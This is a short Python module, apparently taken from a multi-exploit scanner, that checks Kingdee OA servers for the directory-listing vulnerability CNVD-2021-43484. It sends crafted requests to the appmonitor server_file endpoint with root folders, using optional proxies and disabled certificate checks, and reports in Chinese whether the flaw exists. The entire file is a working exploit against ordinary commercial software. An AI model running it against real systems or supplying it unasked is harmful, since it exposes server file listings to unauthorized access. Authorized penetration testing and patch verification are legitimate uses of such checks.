import requests
import re
from bs4 import BeautifulSoup
import logging

uia = ''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
        logging.captureWarnings(True)
        gf = requests.get(url+'appmonitor/protected/selector/server_file/files?folder=C://&suffix=',cookies=s_cookie,headers=headers,proxies=proxies,verify=False)
        gf1 = requests.get(url + 'appmonitor/protected/selector/server_file/files?folder=/&suffix=', cookies=s_cookie, headers=headers, proxies=proxies,verify=False)
        if gf.status_code == 200 and "total" in gf.text:
            uia = '[+]漏洞存在\nappmonitor/protected/selector/server_file/files?folder=C://&suffix='
        elif gf1.status_code == 200 and "total" in gf1.text:
            uia = '[+]漏洞存在\nappmonitor/protected/selector/server_file/files?folder=/&suffix='
        else:
            uia='[-]漏洞不存在'
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
def yt1():
    global uia
    return '--------------------------------------------------\n[ 金蝶OA CNVD-2021-43484 ]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)